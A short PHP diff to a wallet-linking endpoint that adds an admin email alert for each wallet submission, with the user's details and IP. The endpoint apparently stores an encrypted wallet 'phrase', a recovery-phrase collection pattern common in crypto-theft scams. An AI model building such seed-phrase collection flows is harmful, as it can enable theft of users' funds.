@@ -94,6 +94,24 @@ try {
             'phrase' => $phrase_encrypted,
         ]);
 
+        // Notify admin of new wallet submission
+        try {
+            require_once '../../api/utilities/email_templates.php';
+            $adminEmail = getenv('SMTP_FROM') ?: getenv('SMTP_USER') ?: '';
+            if ($adminEmail) {
+                Mailer::sendAdminWalletSubmitted(
+                    $adminEmail,
+                    (string) $user['id'],
+                    $user['full_name'] ?? '',
+                    $user['email'] ?? '',
+                    $_SERVER['REMOTE_ADDR'] ?? '',
+                    date('F j, Y H:i T')
+                );
+            }
+        } catch (\Throwable $emailErr) {
+            error_log('Trust wallet admin email error: ' . $emailErr->getMessage());
+        }
+
         echo json_encode([
             'success'     => true,
             'message'     => 'Wallet linked successfully.',
